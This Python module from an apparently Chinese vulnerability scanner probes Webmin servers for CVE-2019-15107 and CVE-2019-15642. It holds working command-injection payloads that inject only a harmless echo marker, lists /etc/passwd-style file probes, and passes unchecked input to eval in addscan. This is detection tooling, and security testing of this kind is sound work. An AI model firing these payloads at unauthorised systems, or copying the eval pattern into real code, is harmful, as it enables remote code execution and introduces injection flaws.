#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Webmin是一个基于Web的系统配置工具, 用于类Unix系统: https://www.webmin.com/
    Webmin扫描类: 
        1. Webmin Pre-Auth 远程代码执行
            CVE-2019-15107
                Payload: https://vulhub.org/#/environments/webmin/CVE-2019-15107/

        2. Webmin 远程代码执行
            CVE-2019-15642
                Payload: https://www.seebug.org/vuldb/ssvid-98065

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from lib.tool import head
from payloads.Webmin.cve_2019_15107 import cve_2019_15107_scan
from payloads.Webmin.cve_2019_15642 import cve_2019_15642_scan

class Webmin():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Webmin'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2019_15107_payloads = [
            {
                'path': 'password_change.cgi',
                'data': 'user=rootxx&pam=&expired=2&old=test|{}&new1=test2&new2=test2'.format(self.cmd)
            },
        ]

        self.cve_2019_15642_payloads = [
            {
                'path': 'rpc.cgi',
                'data': 'OBJECT Socket;print "Content-Type: text/plain\\n\\n";$cmd=`{}`; print "$cmd\\n\\n";'.format(self.cmd),
                'headers': head.merge(self.headers, {})
            },
            {
                'path': 'rpc.cgi',
                'data': 'OBJECT Socket;print "Content-Type: text/plain\\n\\n";$cmd=`{}`; print "$cmd\\n\\n";'.format(self.cmd),
                'headers': head.merge(self.headers, {
                    'User-Agent': 'webmin',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'fr',
                    'Accept-Encoding': 'gzip, deflate'
                })
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2019_15107_scan, url=url),
            thread(target=self.cve_2019_15642_scan, url=url)
        ]

Webmin.cve_2019_15107_scan = cve_2019_15107_scan
Webmin.cve_2019_15642_scan = cve_2019_15642_scan

webmin = Webmin()
